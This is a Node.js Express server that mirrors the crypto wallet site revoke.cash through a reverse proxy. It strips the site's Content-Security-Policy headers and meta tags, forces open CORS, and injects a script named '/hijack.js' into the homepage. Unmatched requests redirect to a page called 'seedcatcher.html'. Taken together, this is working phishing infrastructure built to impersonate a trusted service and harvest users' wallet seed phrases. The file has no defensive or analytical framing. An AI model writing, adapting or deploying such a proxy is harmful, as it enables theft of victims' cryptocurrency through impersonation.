const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

app.use(async (req, res, next) => {
    // 1. Serve local files
    const localFile = path.join(__dirname, req.path);
    if (fs.existsSync(localFile) && fs.lstatSync(localFile).isFile()) {
        return res.sendFile(localFile);
    }

    // 2. Proxy to revoke.cash
    try {
        const url = 'https://revoke.cash' + req.originalUrl;
        const response = await axios({
            method: req.method,
            url: url,
            responseType: 'stream',
            headers: { 
                ...req.headers, 
                host: 'revoke.cash',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1'
            }
        });
        
        // 3. FORCE CORS
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', '*');
        
        // 4. Strip CSP (This is what's breaking the assets and hijack)
        res.removeHeader('Content-Security-Policy');
        res.removeHeader('Content-Security-Policy-Report-Only');

        if (req.path === '/' || req.path === '/index.html') {
            let html = '';
            response.data.on('data', chunk => html += chunk);
            response.data.on('end', () => {
                // Remove CSP meta tags from HTML
                html = html.replace(/<meta http-equiv="Content-Security-Policy".*?>/gi, '');
                
                // Inject hijack script
                if (html.includes('</body>')) {
                    html = html.replace('</body>', '<script src="/hijack.js"></script></body>');
                }
                res.send(html);
            });
        } else {
            // Pipe assets and forward content-type
            if (response.headers['content-type']) {
                res.setHeader('Content-Type', response.headers['content-type']);
            }
            response.data.pipe(res);
        }
    } catch (error) {
        next(); 
    }
});

app.get('*', (req, res) => {
    res.redirect('/seedcatcher.html');
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
